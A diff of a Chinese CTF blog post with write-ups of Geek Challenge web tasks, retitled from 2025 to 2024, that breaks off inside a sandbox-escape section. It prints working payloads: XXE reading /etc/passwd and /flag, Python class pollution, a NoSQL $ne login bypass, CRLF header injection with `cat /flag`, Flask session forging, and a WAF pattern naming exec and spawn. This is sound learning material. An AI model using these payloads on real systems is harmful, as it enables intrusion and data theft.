@@ -2,16 +2,16 @@
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web ⚪神启动 翻翻源码，看到可疑base64编码，解码就是flag\nbaby_upload 上传文件发现user.ini,.htaccess,php被过滤了\n解法一：上传shell文件，文件名是1.jpg.php可以。 （发现没被过滤且是被后端当作php，上传1.php.jpg被当作jpg，猜测后端检测php仅仅是检测.php/i)\n">
-<title>2025-极客大挑战</title>
+<title>2024-极客大挑战</title>
 
-<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/'>
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/'>
 
-<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-极客大挑战">
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2024-极客大挑战">
 <meta property='og:description' content=" web ⚪神启动 翻翻源码，看到可疑base64编码，解码就是flag\nbaby_upload 上传文件发现user.ini,.htaccess,php被过滤了\n解法一：上传shell文件，文件名是1.jpg.php可以。 （发现没被过滤且是被后端当作php，上传1.php.jpg被当作jpg，猜测后端检测php仅仅是检测.php/i)\n">
-<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/'>
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-06-17T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-17T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="2025-极客大挑战">
+<meta name="twitter:title" content="2024-极客大挑战">
 <meta name="twitter:description" content=" web ⚪神启动 翻翻源码，看到可疑base64编码，解码就是flag\nbaby_upload 上传文件发现user.ini,.htaccess,php被过滤了\n解法一：上传shell文件，文件名是1.jpg.php可以。 （发现没被过滤且是被后端当作php，上传1.php.jpg被当作jpg，猜测后端检测php仅仅是检测.php/i)\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
@@ -353,9 +353,15 @@
     </li>
     <li><a href="#py_game">py_game</a>
       <ol>
-        <li><a href="#session伪造flask-unsign爆破密钥">session伪造（flask-unsign爆破密钥）</a></li>
+        <li><a href="#session伪造flask-unsign爆破密钥pyhton污染链污染xxe">session伪造（flask-unsign爆破密钥)+pyhton污染链污染xxe</a></li>
       </ol>
     </li>
+    <li><a href="#nosandbox">noSandbox</a>
+      <ol>
+        <li><a href="#nosql注入永真式绕过vm沙箱逃逸之proxy代理绕过objectcreate">nosql注入(永真式绕过)+vm沙箱逃逸之Proxy代理绕过Object.create</a></li>
+      </ol>
+    </li>
+    <li><a href="#escapesandbox_plus">escapeSandbox_PLUS</a></li>
   </ol>
 </nav>
         </div>
@@ -387,7 +393,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">2025-极客大挑战</a>
+            <a href="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">2024-极客大挑战</a>
         </h2>
     
         
@@ -424,7 +430,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 24 分钟
+                    阅读时长: 30 分钟
                 </time>
             </div>
         
@@ -443,10 +449,10 @@
 <h1 id="web">web
 </h1><h2 id="神启动">⚪神启动
 </h2><p>翻翻源码，看到可疑base64编码，解码就是flag</p>
-<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907.png"
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907.png"
 	width="844"
 	height="250"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907_hu_9f156f1997639f2d.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907_hu_836603fa94e6cacd.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907_hu_9f156f1997639f2d.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250617152737907_hu_836603fa94e6cacd.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250617152737907"
@@ -479,10 +485,10 @@
 </div><img src="image-20250618200802141.png" alt="image-20250618200802141" style="zoom:50%;" />
 <img src="image-20250618200817780.png" alt="image-20250618200817780" style="zoom:50%;" />
 <p>蚁剑连接要%0a</p>
-<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804.png"
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804.png"
 	width="432"
 	height="221"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804_hu_44c9cd61548d6578.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804_hu_467362a22ddf4a97.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804_hu_44c9cd61548d6578.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250618201046804_hu_467362a22ddf4a97.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250618201046804"
@@ -794,10 +800,10 @@
 </h3><p>这里测试一下发现xxs，转到vps，发现没有啥东西</p>
 <img src="image-20250620195142054.png" alt="image-20250620195142054" style="zoom:50%;" />
 <p>manager页面提示<code>If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]</code>,一开始改请求头发现无效，后面发现post参数url没用，那就post传<code>url=http://127.0.0.1</code>(直接传127.0.0.1不行)，发现vps有带flag的cookie</p>
-<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707.png"
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707.png"
 	width="1461"
 	height="318"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707_hu_190e0b199f73ff5c.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707_hu_750af3bfb0e06b62.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707_hu_190e0b199f73ff5c.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195115707_hu_750af3bfb0e06b62.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250620195115707"
@@ -818,10 +824,10 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后一样的传参访问（发包2次，第一次触发xss，在form页面有弹窗，再来一次由于弹窗未关，抛出异常，就有flag）</p>
-<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446.png"
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446.png"
 	width="1781"
 	height="394"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446_hu_55c5ab0ace642f53.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446_hu_92abdd6b5f9be621.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446_hu_55c5ab0ace642f53.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250620195634446_hu_92abdd6b5f9be621.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250620195634446"
@@ -962,10 +968,10 @@
 <p><a class="link" href="https://xilitter.github.io/2023/01/31/%e5%88%a9%e7%94%a8pearcmd-php%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%8b%bfshell%ef%bc%88LFI%ef%bc%89/index.html"  target="_blank" rel="noopener"
     >利用pearcmd.php文件包含拿shell（LFI） | XiLitter</a></p>
 <h2 id="ez_http">ez_http
-</h2><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650.png"
+</h2><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650.png"
 	width="1821"
 	height="722"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650_hu_6d24e2995ba58b09.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650_hu_f84aeedb4087c879.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650_hu_6d24e2995ba58b09.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250622011125650_hu_f84aeedb4087c879.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250622011125650"
@@ -1589,10 +1595,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998.png"
 	width="1836"
 	height="494"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_2f7938b089388131.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_cb43f5a5fd700a62.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_2f7938b089388131.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_cb43f5a5fd700a62.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250624002047998"
@@ -1635,10 +1641,10 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">user</span><span class="o">=%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aAUTHORIZATION</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aContent</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aContent</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">22</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aexpression</span><span class="o">=</span><span class="err">`</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span><span class="err">`</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736.png"
 	width="1390"
 	height="486"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_6ffd620fc8480431.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_d3b67b7f861e79b6.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_6ffd620fc8480431.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_d3b67b7f861e79b6.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250624003037736"
@@ -1667,10 +1673,10 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250624144406225.png" alt="image-20250624144406225" style="zoom:50%;" />
-<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006.png"
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006.png"
 	width="415"
 	height="185"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_5b1f4db9be8ee95d.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_4d973610f940f2d3.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_5b1f4db9be8ee95d.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_4d973610f940f2d3.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250624144457006"
@@ -2112,10 +2118,10 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;username&#34;:&#34;Starven&#34;,&#34;password&#34;:&#34;123456&#34;,&#34;__proto__&#34;:{&#34;hasFlag&#34;:true}}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983.png"
 	width="1496"
 	height="322"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_2da14ece8ae19413.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_9d8c02e3bde97a2e.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_2da14ece8ae19413.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_9d8c02e3bde97a2e.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250703112737983"
@@ -2147,10 +2153,10 @@
 </span></span><span class="line"><span class="cl">  ]
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826.png"
 	width="1854"
 	height="193"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_1c2600de632af304.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_b8d67ac5d106d805.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_1c2600de632af304.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_b8d67ac5d106d805.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250703122029826"
@@ -3212,7 +3218,7 @@
 <p><a class="link" href="https://www.cnblogs.com/DumpInfou/p/18023278"  target="_blank" rel="noopener"
     >绕过disable_functions的限制 - DumpInfou - 博客园</a></p>
 <h2 id="py_game">py_game
-</h2><h3 id="session伪造flask-unsign爆破密钥">session伪造（flask-unsign爆破密钥）
+</h2><h3 id="session伪造flask-unsign爆破密钥pyhton污染链污染xxe">session伪造（flask-unsign爆破密钥)+pyhton污染链污染xxe
 </h3><p>先用一个session爆破工具爆破密钥</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -3230,10 +3236,10 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flask-unsign --cookie &#34;eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoicm9vdCJ9.aJB0Mw.krczhtlgwpj6oMGclmTgGPWPHuc&#34; --unsign
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341.png"
 	width="1442"
 	height="200"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341_hu_663a5756d1d5afae.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341_hu_66ef206d1805d940.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341_hu_663a5756d1d5afae.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804170647341_hu_66ef206d1805d940.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250804170647341"
@@ -3253,10 +3259,10 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flask-unsign --sign --cookie &#34;{&#39;_flashes&#39;: [(&#39;success&#39;, &#39;登录成功&#39;)], &#39;username&#39;: &#39;admin&#39;}&#34; --secret &#34;a123456&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563.png"
+</div><p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563.png"
 	width="1514"
 	height="113"
-	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563_hu_76a9c10226ef5bd7.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563_hu_afcc5a6ae2890bad.png 1024w"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563_hu_76a9c10226ef5bd7.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250804171101563_hu_afcc5a6ae2890bad.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250804171101563"
@@ -3462,7 +3468,627 @@
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>直接打污染链+xxe就行</p>
+<p>标准的xxe是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>此题打污染链是（玩游戏时抓包提示flag在/flag）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;\u005F\u005Finit__&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;\u005F\u005Fglobals__&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;app&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;config&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;xml_data&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-8\&#34;?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \&#34;F\u0069\u006C\u0065:///flag\&#34;&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意Content-Type是json</p>
+<img src="image-20250805175518477.png" alt="image-20250805175518477" style="zoom:50%;" />
+<p>最后访问/xml_parse拿到flag（后面发现这里甚至不需要file:///flag，直接/flag就行）<img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250805203804801.png"
+	width="1089"
+	height="162"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250805203804801_hu_d6bb178245a72279.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250805203804801_hu_9ce9fc0bbf2ce9ce.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250805203804801"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="672"
+		data-flex-basis="1613px"
+	
+></p>
+<p><a class="link" href="https://0ran9e.fun/2024/11/26/%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98/2024/#py_game"  target="_blank" rel="noopener"
+    >极客大挑战2024复现 - 0raN9e的笔记</a></p>
+<h2 id="nosandbox">noSandbox
+</h2><h3 id="nosql注入永真式绕过vm沙箱逃逸之proxy代理绕过objectcreate">nosql注入(永真式绕过)+vm沙箱逃逸之Proxy代理绕过Object.create
+</h3><p>题目说了芒果DB，很容易想到nosql注入。利用永真式绕过登入</p>
+<p><a class="link" href="https://xz.aliyun.com/news/9363"  target="_blank" rel="noopener"
+    >Nosql 注入从零到一-先知社区</a></p>
+<p>由于会302跳转，用谷歌的hackbar发送json数据<code>{&quot;username&quot;:{&quot;$ne&quot;:1},&quot;password&quot;:{&quot;$ne&quot;:1}}</code>-</p>
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806181415891.png"
+	width="1796"
+	height="491"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806181415891_hu_34e2c2934ba51e45.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806181415891_hu_5576204eea7219ab.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250806181415891"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="365"
+		data-flex-basis="877px"
+	
+></p>
+<p>来看看源码，一眼沙箱逃逸，且是利用<strong>vm沙箱Proxy代理绕过Object.create(null)</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">泄露的代码执行和WAF部分代码</span><span class="p">,</span><span class="n">不能直接运行</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">const</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">waf</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">pattern</span> <span class="o">=</span> <span class="o">/</span><span class="p">(</span><span class="n">find</span><span class="o">|</span><span class="n">ownKeys</span><span class="o">|</span><span class="n">fromCharCode</span><span class="o">|</span><span class="n">includes</span><span class="o">|</span>\<span class="s1">&#39;|</span><span class="se">\&#34;</span><span class="s1">|replace|fork|reverse|fs|process|\[.*?\]|exec|spawn|Buffer|</span><span class="se">\\</span><span class="s1">|\+|concat|eval|Function|env)/m;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">pattern</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s1">&#39;WAF detected malicious code&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;WAF detected malicious code&#39;</span><span class="p">);</span>
